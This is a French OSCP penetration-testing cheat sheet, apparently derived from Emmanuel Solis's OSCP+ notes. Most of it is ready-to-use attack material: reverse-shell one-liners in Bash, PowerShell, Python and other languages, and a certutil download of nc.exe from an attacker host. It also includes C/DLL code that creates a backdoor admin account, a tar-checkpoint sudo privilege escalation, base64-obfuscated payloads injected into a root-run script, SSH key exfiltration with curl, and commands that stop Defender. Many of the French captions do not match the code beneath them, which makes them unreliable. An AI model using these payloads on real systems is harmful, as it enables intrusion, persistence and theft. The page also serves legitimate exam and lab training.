---
title: "OSCP · Utilitaires"
description: "Commandes courantes et outils complémentaires."
---

# OSCP · Utilitaires

Commandes courantes et outils complémentaires.


### Bash


<p class="oscp-command-note">Exécuter un script shell.</p>

```bash
# Direct Bash reverse shell
/bin/bash -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1

# Ajouter le shell inverse à un fichier existant
echo '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> file

```


<p class="oscp-command-note">Supprimer les fichiers indiqués.</p>

```bash
# FIFO method with Netcat
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <TARGET_IP> <TARGET_PORT> >/tmp/f

# Utilisation de 'sh' pour le shell inverse
sh -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1

```


### CMD


<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\nc.exe</code></p>


<p class="oscp-command-note">Examiner les paramètres des certificats Windows.</p>

```bash
# Télécharger Netcat depuis un CMD
certutil.exe -urlcache -split -f http://[attacker_ip]/nc.exe nc.exe

# Exécuter la commande shell inverse
.\nc.exe 192.168.45.215 444 -e cmd.exe

# (Optional) use double backslash to handling special character if it is part of an injection command
.\\\\nc.exe 192.168.45.215 444 -e cmd.exe

```


### Golang


<p class="oscp-command-note">Afficher ou écrire une valeur.</p>

```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<TARGET_IP>:<TARGET_PORT>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go

```


### Java




```text
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<TARGET_IP>/<TARGET_PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

```


### Lua




```bash
lua -e "require('socket');require('os');t=socket.tcp();t:connect('<TARGET_IP>',<TARGET_PORT>);os.execute('/bin/sh -i <&3 >&3 2>&3');"

```


### Montant net

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Établir ou tester une connexion avec Netcat.</p>

```bash
# Avec l’option -e
nc <TARGET_IP> <TARGET_PORT> -e /bin/sh
nc -nv <TARGET_IP> <TARGET_PORT> -e /bin/bash

# Sans l’option -e
mkfifo /tmp/f; nc <TARGET_IP> <TARGET_PORT> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f

# Ajouter le shell inverse à un fichier existant
echo 'nc [lhost] [lport] -e /bin/bash' >> [file]

```


### Perl




```bash
perl -e 'use Socket;$i="<TARGET_IP>";$p=<TARGET_PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```


### PowerShell

Observer les permissions et la configuration de Windows.


<p class="oscp-command-note">Exécuter un script PowerShell.</p>

```powershell
# Main Option
powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('<TARGET_IP>', <TARGET_PORT>);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"

# Autre
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<TARGET_IP>', <TARGET_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"

```


### PHP

Examiner les entrées et les réponses de l'application web.




```bash
php -r '$sock=fsockopen("<TARGET_IP>",<TARGET_PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

```


### Python


<p class="oscp-command-note">Exécuter un script Python.</p>

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TARGET_IP>",<TARGET_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```


### Ruby




```bash
ruby -rsocket -e 'f=TCPSocket.open("<TARGET_IP>",<TARGET_PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

```


### Socat


<p class="oscp-command-note">Configurer une connexion ou une redirection réseau.</p>

```bash
socat TCP:<TARGET_IP>:<TARGET_PORT> EXEC:/bin/bash

```


### Telnet


<p class="oscp-command-note">Supprimer les fichiers indiqués.</p>

```bash
rm -f /tmp/p; mknod /tmp/p p && telnet <TARGET_IP> <TARGET_PORT> 0</tmp/p | /bin/sh 1>/tmp/p 2>&1

```


### Tool for Generating Reverse Shell


<p class="oscp-command-note">Examiner les fichiers et l&#x27;historique Git.</p>

```bash
git clone https://github.com/ShutdownRepo/shellerator
pip3 install --user -r requirements.txt
sudo cp shellrator.py /bin/shellrator

shellrator

```


### Adjust Interactive Shells


<p class="oscp-command-note">Script shell dans la rubrique « Adjust Interactive Shells ».</p>

```bash
# Trouvez la taille du terminal (remplacez les valeurs avec la sortie réelle)
stty size  # Example output: 50 235

# Background the shell and adjust settings
Ctrl-Z
stty raw -echo  # Disable shell echo
fg
export SHELL=bash
export TERM=xterm  # Or use xterm-256color for extended color support

# Définir la taille du terminal
stty rows <ROWS> columns <COLS>

```


### Bash


<p class="oscp-command-note">Exécuter un script shell.</p>

```bash
# Spawn a new Bash shell
bash -i

```


### Lua




```text
# Exécuter un nouveau shell Bash
os.execute('/bin/bash')

```


### Perl




```bash
# Exécuter un nouveau shell Bash
perl -e 'exec "/bin/bash"'

```


### Python


<p class="oscp-command-note">Script Python lié à « Python ».</p>

```python
# Python 2.x
python -c 'import pty; pty.spawn("/bin/bash")'

# Python 3.x
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Upgrade to a TTY shell with Python
python -c 'import pty; import os; pty.spawn("/bin/bash"); os.system("stty raw -echo")'

```


### Ruby




```ruby
# Exécuter un nouveau shell Bash
exec "/bin/bash"

```


### Sh




```text
# Spawn a new interactive shell
sh -i

```


### Linux

Examiner les permissions et la configuration de Linux.


#### Outils BloodHound

Examiner les objets, les droits et les services du domaine.


#### Other Utilitaires


<p class="oscp-command-note">Gérer les paquets Debian/Ubuntu.</p>

```bash
sudo apt install krb5-user

```


```bash
sudo apt update && sudo apt upgrade && sudo apt install putty-tools

```


### Windows

Observer les permissions et la configuration de Windows.


#### Outils BloodHound

Examiner les objets, les droits et les services du domaine.




```text
.\SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.49.194 445 -e powershell.exe"

```


#### Outils Kerberos

Examiner les objets, les droits et les services du domaine.


### Utilisation des pouvoirs

Vérifier les comptes, les secrets et les mécanismes d'authentification.


<p class="oscp-command-note">Ouvrir une session RDP.</p>

```bash
xfreerdp /compression +auto-reconnect /u:[user] /p:'[password]' /v:[IP] +clipboard /size:1920x1080 /drive:desktop,/home/[your_username]/Desktop

```


### Utilisation de Hashes

Vérifier les comptes, les secrets et les mécanismes d'authentification.


<p class="oscp-command-note">Ouvrir une session RDP.</p>

```bash
# Utiliser un hachage NTLM.
xfreerdp /size:1920x1080 /v:[IP] /u:[user] /H:[hash] /cert:ignore /dynamic-resolution

```


### Demande de pouvoirs

Vérifier les comptes, les secrets et les mécanismes d'authentification.


<p class="oscp-command-note">Ouvrir une session RDP.</p>

```bash
# Utile lorsque GUI est nécessaire pour les attaques.
rdesktop [IP]

```


### Général RDP Connexion


<p class="oscp-command-note">Ouvrir une session RDP.</p>

```bash
# Connectez-vous avec un nom d'utilisateur et un mot de passe
xfreerdp /size:1920x1080 /u:[user] /p:[password] /v:[host/ip] /drive:desktop,/home/[your_username]/Desktop

```




```bash
# Connectez-vous aux dimensions et aux références spécifiées
rdesktop [IP] -u [user] -p [password] -g 80%+150+100

```


### Activer RDP En cas de handicap


<p class="oscp-command-note">Script PowerShell dans la rubrique « Enable RDP If Disabled ».</p>

```powershell
$ComputerName = hostname
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
# Si le résultat est 1 alors RDP est désactivé

# Définir les informations NLA à désactivées pour permettre RDP
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)

# Définir les informations NLA pour permettre de refuser RDP
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(1)

```




```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

```




```powershell
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "[username]"

```




```powershell
# Option 1: Using Ad User
Add-ADGroupMember -Identity "Remote Desktop Users" -Members "[domain]\[username]"

# Option 2: Using net
net localgroup "Remote Desktop Users" "[domain]\[username]" /add

```




```powershell
# Ceci est fait parce que si un pare-feu est configuré, il peut causer des problèmes pour notre RDP

# Get status: si True la règle est activée et RDP devrait fonctionner
Get-NetFirewallRule -DisplayGroup "Remote Desktop"

# Enabled if it's disabled, ensures traffic via port 3389 is not blocked
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

```




```powershell
# 1. Créer le nouvel utilisateur
New-ADUser -Name "[username]" -AccountPassword (ConvertTo-SecureString "P@ssword123!" -AsPlainText -Force) -Enabled $true

# 2. Confirmer qu'il a été créé avec succès (devrait apparaître dans la liste)
Get-NetUser | select cn

# 3. Ajouter un utilisateur au groupe RDP, doit être exécuté en tant qu'administrateur
Add-ADGroupMember -Identity "Remote Management Users" -Members [username]

# 4. Ajouter utilisateur au groupe Adinistrators, doit être exécuté en tant qu'administrateur
Add-ADGroupMember -Identity "Administrators" -Members [username]

# 5. Enable RDP Usage
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# 6. Connect to RDP
rdesktop -u [username] -p 'P@ssword123!' -d [domain.com] [victim_ip]

```


## Decoding Techniques


<p class="oscp-command-note">Afficher ou écrire une valeur.</p>

```bash
# Decode
echo "72 101 108 108 111" | awk '{for(i=1;i<=NF;i++) printf("%c",$i)}'

# Encode
echo -n "Hello" | od -An -t uC | tr -d ' \n'

```


```bash
# Decode
echo "SGVsbG8gd29ybGQ=" | base64 -d

# Encode
echo "Hello world" | base64

```


```bash
# Decode
echo "48656c6c6f20776f726c64" | xxd -r -p

# Encode
echo "Hello world" | xxd -p

```


```bash
# Decode
echo "dlrow olleH" | rev

# Encode
echo "Hello world" | rev

```


```bash
# Decode
echo "Uryyb jbeyq" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Encode
echo "Hello world" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

```


```bash
# Decode
echo "Hello%20World%21" | python3 -c "import urllib.parse, sys; print(urllib.parse.unquote(sys.stdin.read().strip()))"

# Encode
echo "Hello World!" | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read().strip()))"

```


### De base Requests


<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>

```bash
curl http://example.com

```


```bash
# Récupérer une ressource HTTP
curl -H "Accept: application/json" http://example.com

```


### Présentation des données


<p class="oscp-command-note">Envoyer une requête HTTP POST.</p>

```bash
curl -X POST -d "param1=value1&param2=value2" http://example.com/submit

```


```bash
# Récupérer une ressource HTTP
curl -H "Content-Type: application/json" -X POST -d '{"key1":"value1", "key2":"value2"}' http://example.com/api

```


```bash
# Récupérer une ressource HTTP
curl -X POST -d "param1=value1&param2=value2" --data-urlencode http://example.com/submit

```


```bash
# Récupérer une ressource HTTP
curl -X PUT -d "param1=value1&param2=value2" http://example.com/update

```


```bash
# Récupérer une ressource HTTP
curl -X DELETE http://example.com/delete

```


### Authentification and Headers


<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>

```bash
curl -u username:password http://example.com

```


```bash
# Récupérer une ressource HTTP
curl -A "CustomUserAgent/1.0" http://example.com

```


### Response Handling


<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>

```bash
curl -i http://example.com

```


```bash
# Récupérer une ressource HTTP
curl -o filename.html http://example.com

```


```bash
# Récupérer une ressource HTTP
curl -I http://example.com

```


```bash
# Récupérer une ressource HTTP
curl -s http://example.com

```


```bash
# Récupérer une ressource HTTP
curl -v http://example.com

```


### Cookies and Session Management


<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>

```bash
curl -b "cookie1=value1; cookie2=value2" http://example.com

```


```bash
# Récupérer une ressource HTTP
curl -c cookies.txt http://example.com

```


```bash
# Récupérer une ressource HTTP
curl -b cookies.txt http://example.com

```


### Opérations de fichiers


<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>

```bash
curl -F "file=@path/to/file" http://example.com/upload

```


```bash
# Récupérer une ressource HTTP
curl -C - -o filename http://example.com/file

```


### Proxy and Security

Configurer et comprendre les chemins de communication réseau.


<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>

```bash
curl -x http://proxyserver:port http://example.com

```


```bash
# Récupérer une ressource HTTP
curl -k https://example.com

```


### Complémentaire Options


<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>

```bash
curl -L http://example.com

```


```bash
# Récupérer une ressource HTTP
curl --max-time 30 http://example.com

```


```bash
# Récupérer une ressource HTTP
curl -s -o /dev/null -w "%{http_code}" http://example.com

```


```bash
# Récupérer une ressource HTTP
curl --http2 http://example.com

```


## Generate a SSH Key




```bash
ssh-keygen -t rsa -b 4096 -f /tmp/id_rsa -N ''

```


<p class="oscp-command-note">Exécuter un script Python.</p>

```bash
python3 -m http.server 80

```


<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>

```bash
curl -T /tmp/id_rsa http://<attacker_ip>/id_rsa

```


<p class="oscp-command-note">Supprimer les fichiers indiqués.</p>

```bash
# Supprimer les fichiers clés de la machine victime pour éviter de laisser des fichiers sensibles.
rm /tmp/id_rsa /tmp/id_rsa.pub

```


<p class="oscp-command-note">Télécharger une ressource distante.</p>

```bash
# Remplacer <victim_ip> par l'adresse IP où la clé privée a été téléchargée.
wget http://<victim_ip>/id_rsa

```


<p class="oscp-command-note">Modifier les permissions d&#x27;un fichier.</p>

```bash
chmod 600 id_rsa

```


<p class="oscp-command-note">Se connecter avec une clé SSH privée.</p>

```bash
ssh -i id_rsa user@<victim_ip>

```


## Compilation croisée pour Windows

Observer les permissions et la configuration de Windows.




```text
#include <stdlib.h>

int main ()
{
  system("net user emma Password123! /add");
  system("net localgroup administrators emma /add");
  return 0;
}

```




```text
#include <windows.h>  
#include <stdlib.h>  

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
  switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
      // Code exécuté lors du chargement de la DLL
      system("net user emma Password123! /add");
      system("net localgroup administrators emma /add");
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
  }
  return TRUE; // Indicate successful execution
}

```


<p class="oscp-command-note">Script shell dans la rubrique « Cross Compiling for Windows ».</p>

```bash
# Cross-Compile the C Code to a 64-bit Application
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# Cross-Compile the C Code to a DLL
x86_64-w64-mingw32-gcc -shared -o adduser.dll adduser.c -Wl,--subsystem,windows

```


## Managing Flags


<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>

```bash
find / -type f -name local.txt 2>/dev/null

```


<p class="oscp-command-note">Afficher le nom de la machine.</p>

```bash
# Linux
hostname && whoami && cat proof.txt && ip a 

# Windows
hostname && whoami && type [local/proof].txt && ipconfig /all

```


## Complémentaire Tips


<p class="oscp-command-note">Lister les fichiers du répertoire.</p>

```bash
# Exemple de propriété de fichier avant changement
ls -l id_rsa
# Exemple de sortie : -rw------- 1 root root 3381 Sep 24 2020 id_rsa

# Changer la propriété du fichier pour un nouvel utilisateur
sudo chown <new_owner> <file_name>

# Exemple de propriété du fichier après changement
ls -l id_rsa
# Exemple de sortie : -rw------- 1 <new_owner> root 3381 Sep 24 2020 id_rsa

```




```bash
# Ajouter un utilisateur à un groupe
sudo usermod -aG <group_name> <username>

```


<p class="oscp-command-note">Afficher les métadonnées d&#x27;un fichier.</p>

```bash
exiftool -a -u [file.extension]

```




```bash
hashid [hash]

```


**Paramètres et repères :**
`xato-net-10-million-usernames.txt` · `/etc/sudoers`  


<p class="oscp-command-note">Changer de répertoire.</p>

```bash
# L'idée est d'avoir le fichier sudoers avec cette ligne: emma ALL=(root) NOPASSWD: ALL

cd /tmp
touch payload.sh
echo "echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers" > payload.sh # Or use nano to add the file if possible
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh payload.sh'
# La commande ci-dessous est possible car nous avons coché sudo -l et avons vu le tar de permission pour l'utilisateur.
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
# Après cela nous pouvons vérifier avec sudo -l et devrait voir la ligne: (root) NOPASSWD: ALL. L'accès au shell racine
sudo /bin/bash

```


<p class="oscp-command-note">Afficher ou écrire une valeur.</p>

```bash
echo "-----BEGIN OPENSSH PRIVATE KEY----- ... -----END OPENSSH PRIVATE KEY-----" > /tmp/id_rsa

```


<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>

```bash
find [directoryPath] -maxdepth 5 -name "*.php" -exec grep -Hni "password" {} \; 2>/dev/null

```


<p class="oscp-command-note">Afficher ou écrire une valeur.</p>

```bash
# Shen a trouvé un script propriété et géré par root mais en écriture pour nous

# At target machine  
echo -n "chmod u+s /bin/bash" | base64  
echo "echo -n 'Y2htb2QgdStzIC9iaW4vYmFzaA=='|base64 -d|bash" >> /var/backups/etc_Backup.sh  

#wait for a few second  
ls -al /bin/bash  
/bin/bash -p  

#You can use other payload as well such as  
echo -n "sh -i >& /dev/tcp/$KaliIP/80 0>&1" | base64  
echo "echo -n 'c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xNzYvODAgMD4mMQ=='|base64 -d|bash" >> /var/backups/etc_Backup.sh

```


<p class="oscp-command-note">Script PowerShell dans la rubrique « Complémentaire Tips ».</p>

```powershell
# Trouver un fichier
locate <FILE>
find / -name "<FILE>"

# Afficher les connexions actives
netstat -lntp

# Liste tous les fichiers SUID
find / -perm -4000 2>/dev/null

# Determine version of Linux
cat /etc/issue
uname -a

# Liste des processus d'exécution
ps -faux

Get-ChildItem -Path C:\Users\ -Include *.* -File -Recurse -ErrorAction SilentlyContinue

# Shows only hidden files
Dir -Hidden

# Shows all files (including hidden)
Dir -Force

dir /s pass == cred == vnc == .config
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Désactive le défenseur des fenêtres
sc stop WinDefend

# Bypass restriction
powershell -nop -ep bypass

# Liste des fichiers cachés
dir /a

# Trouver un fichier
dir /b/s "<FILE>"

```


<p class="oscp-command-note">Script shell dans la rubrique « Complémentaire Tips ».</p>

```bash
# Créer un nouveau groupe avec un GID spécifique
sudo groupadd -g <gid> <group_name>

# Créer un nouvel utilisateur avec un UID spécifique et GID
sudo useradd -u <uid> -g <gid> <username>

# Définir un mot de passe pour le nouvel utilisateur
sudo passwd <username>

```




```bash
# Linux
export PATH="$PATH:/usr/local/bin:/usr/bin:/bin"

# Windows
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;

```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
